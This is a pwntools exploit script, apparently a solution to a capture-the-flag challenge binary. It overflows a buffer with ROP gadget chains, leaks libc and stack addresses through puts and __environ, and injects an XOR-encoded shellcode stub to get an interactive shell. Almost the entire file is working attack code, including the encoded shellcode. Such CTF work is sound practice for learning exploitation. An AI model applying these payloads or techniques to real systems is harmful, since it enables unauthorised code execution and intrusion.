#!/usr/bin/env python3
from pwn import *

"""

"""
context.terminal = ["tmux", "new-window"]

bin = ELF("./chall_patched",checksec=False)
libc = ELF("./libc.so.6",checksec=False)

context.binary = bin

def conn():
    if args.GDB:
        io = gdb.debug([bin.path], gdbscript='''
        b*vuln+107
        c
        ''')
    elif args.REMOTE:
        io = remote("", )
    else:
        io = process([bin.path])
    return io

def main(io):
    pld = b"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
    pld += b"\xc3\x12\x40\x00\x00\x00\x00\x00\x18\x40\x40\x00\x00\x00\x00\x00\x64\x10\x40\x00\x00\x00\x00\x00\x29\x12\x40\x00\x00\x00\x00\x00"
    io.sendlineafter(b"\n",pld)

    leak = u64((io.recv(6).ljust(8, b'\x00')))

    print(hex(libc.symbols['puts'] ))
    print(hex(libc.symbols['__environ'] ))
    
    info("Leaked libc address,  puts: "+ hex(leak))
    libc.address = leak - libc.symbols['puts'] 
    info("libc base @ %s" % hex(libc.address))
    
    pld2 = b"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
    pld2 += b"\xc3\x12\x40\x00\x00\x00\x00\x00"+ p64(libc.address + 0x1ef600) +b"\x64\x10\x40\x00\x00\x00\x00\x00\x29\x12\x40\x00\x00\x00\x00\x00"

    io.sendlineafter(b"Please leave a comment: \n",pld2)

    leak = u64((io.recv(6).ljust(8, b'\x00')))

    pld3 = b"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
    pld3 += p64(leak + 0x118 - 0x30 - 512) + b"\x00\x00\xeb\x18\x5f\x48\x31\xc9\x6a\x43\x58\x30\x04\x0f\xd0\xc8\x48\x83\xf9\x52\x74\x0b\x90\x48\xff\xc1\xeb\xef\xe8\xe3\xff\xff\xff\xa8\xe3\x98\x59\xc2\x45\x4d\x0e\x34\xa9\xba\x6a\x6c\x15\x08\xcf\xca\x61\x98\xfe\x7c\x3b\xcf\x34\x03\xe9\x5d\x1c\x10\xda\x41\x0f\x84\xae\xd5\x38\x7c\x9f\xcd\x06\x77\xa7\x92\x20\xb1\xda\x79\x83\x0b\x5e\x18\x83\xc6\x40\x4d\x31\x42\x11\xd1\x67\x31\xaa\x31\xce\xbc\x6e\xdf\x6d\xdc\xa3\xf2\x79\xbc\xc7\xbc\x09\x53\x34\x79\xfe\x37\xd9\x0a"

    io.sendlineafter(b"Please leave a comment: \n",pld3)

    io.interactive()


if __name__ == "__main__":
    io = conn()
    main(io)
